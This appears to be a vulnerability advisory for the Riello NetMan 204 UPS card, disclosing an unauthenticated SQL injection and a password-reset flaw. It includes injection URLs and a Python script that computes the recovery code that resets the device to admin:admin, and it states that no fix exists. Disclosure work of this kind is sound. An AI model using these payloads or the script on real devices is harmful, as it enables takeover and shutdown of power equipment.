Vulnerable versions
-------------------------------------------------------------------------------
NetMan 204 / 4.05

Vulnerability overview
-------------------------------------------------------------------------------
1) SQL Injection (CVE-2024-8877)
The three endpoints /cgi-bin/db_datalog_w.cgi, /cgi-bin/db_eventlog_w.cgi, and
/cgi-bin/db_multimetr_w.cgi are vulnerable to SQL injection without prior
authentication. This enables an attacker to modify the collected log data in an
arbitrary way.

2) Unauthenticated Password Reset (CVE-2024-8878)
By navigating to the endpoint /recoverpassword.html an attacker can gather the
netmanid from the UPS. This id can be used to calculate the recovery code for
resetting the password. This way enables an attacker to take over control of
the UPS and e.g. turn it off.


Proof of Concept
-------------------------------------------------------------------------------
1) SQL Injection (CVE-2024-8877)
The system is subsceptible to SQL injections, which is illustrated by the
following payloads:

AND 1=0:
/cgi-bin/db_eventlog_w.cgi?date_start=1715609000&date_end=1715630160&
gravity=%25&type=%25%27and/**/%271%27=%270

AND 1=1:
/cgi-bin/db_eventlog_w.cgi?date_start=1715609000&date_end=1715630160&
gravity=%25&type=%25%27and/**/%271%27=%271

The first request does not return any data, while the second request returns
all entries with a start and end date in the given interval.

2) Unauthenticated Password Reset (CVE-2024-8878)
The following python script can be used to generate the recovery code from the
netmanid:

import hashlib
import sys
def calc_code(netman_id):
    secret = b"NMP"
    netman_id = secret + netman_id[3:]
    round1 = hashlib.md5(netman_id).hexdigest().encode('utf-8')
    round2 = hashlib.sha1(round1).hexdigest()
    code = round2[5:5+7]
    return code
if len(sys.argv) < 2:
    sys.exit("usage: {} netman_id".format(sys.argv[0]))
netman_id = sys.argv[1]
print(calc_code(netman_id.encode('utf-8'))

Inputting the recovery code in /recoverpassword.html resets the login
credentials to admin:admin.


Solution
-------------------------------------------------------------------------------
None

Workaround
-------------------------------------------------------------------------------
Limit access to the device.

Recommendation
-------------------------------------------------------------------------------
Riello should release a firmware update that fixes the mentioned
vulnerabilities.
Customers should not use this device in productive networks.
